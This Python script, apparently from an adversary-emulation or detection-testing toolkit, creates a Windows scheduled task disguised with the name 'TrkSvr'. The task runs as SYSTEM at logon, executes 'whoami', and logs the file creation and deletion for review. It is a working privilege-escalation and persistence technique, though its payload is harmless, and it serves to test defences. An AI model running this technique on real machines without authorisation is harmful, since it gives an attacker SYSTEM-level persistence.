# Used Lateral_commands.py
# Time : 15 minutes

# Create shcedule task

import os
import time

import common


def schtasks(*args, **kwargs):
    return common.execute(['schtasks.exe'] + list(args), **kwargs)


def main():
    # Second way
    common.log("Scheduled Task Privilege Escalation")

    task_name = 'TrkSvr'
    file_path = os.path.abspath('task.log')
    command = "cmd.exe /c whoami.exe > " + file_path

    # Delete the task if it exists
    # code, output = schtasks('/query', '/tn', task_name)
    # if code == 0:
    #    common.log("The Task was already created -> trying to update the task")
    #    schtasks('/delete', '/tn', task_name, '/f')

    code, output = schtasks('/create', '/tn', task_name, '/ru', 'system', '/tr', command, '/sc', 'onlogon', '/F')
    if code != 0:
        common.log("Error creating task", log_type="!")

    # Run the task and grab the file
    code, output = schtasks('/run', '/tn', task_name)
    if code == 0:
        common.log("Running Scheduled Task")
        time.sleep(2)
        try:
            common.print_file(file_path)
            row2 = [common.HOSTNAME, common.gettime(), 'File', file_path, 'Created', 'Completed']
        except:
            row2 = [common.HOSTNAME, common.gettime(), 'File', file_path, 'Created', 'Failed']
        common.logcsv(row2)
        common.log("Log File saved")
        time.sleep(1)
        try:
            common.remove_file(file_path)
            row2 = [common.HOSTNAME, common.gettime(), 'File', file_path, 'Deleted', 'Completed']
        except:
            row2 = [common.HOSTNAME, common.gettime(), 'File', file_path, 'Deleted', 'Failed']
        common.logcsv(row2)
        common.log("Log File Was Deleted")
